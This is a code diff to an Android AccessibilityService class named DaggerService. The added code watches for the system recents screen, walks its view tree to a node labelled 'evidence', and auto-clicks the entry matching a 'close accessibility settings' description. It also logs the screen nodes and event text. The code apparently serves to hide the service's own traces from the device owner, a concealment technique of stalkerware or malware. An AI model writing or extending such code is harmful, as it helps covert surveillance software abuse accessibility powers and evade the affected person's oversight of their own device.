@@ -19,6 +19,8 @@ import android.content.IntentFilter
 import android.os.Build
 import android.util.Log
 import android.view.accessibility.AccessibilityEvent
+import android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK
+import android.view.accessibility.AccessibilityNodeInfo.ACTION_SELECT
 
 class DaggerService : AccessibilityService() {
 
@@ -76,7 +78,21 @@ class DaggerService : AccessibilityService() {
             AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
                 if (event.packageName == Config.SYSTEMUI_PACKAGE_NAME && event.className.contains("recent", true)) {
                     // TODO: Remove AccessibilityService from recents list.
+                    val source = event.source
+                    val recents = source.getChild(0)
+                    val evidence = recents?.getChild(recents.childCount - 1)
+                    if (evidence != null) {
+                        for (index in 0 until evidence.childCount) {
+                            val child = evidence.getChild(index)
+                            val childText = child.contentDescription?.toString()
+                            if (childText != null && childText == Config.CLOSE_ACCESSIBILITY_SETTINGS) {
+                                child.performAction(ACTION_CLICK)
+                            }
+                            Log.d(TAG, child.toString())
+                        }
+                    }
                     Log.d(TAG, "In recent events.")
+                    Log.d(TAG, event.text.toString())
                 }
             }
         }
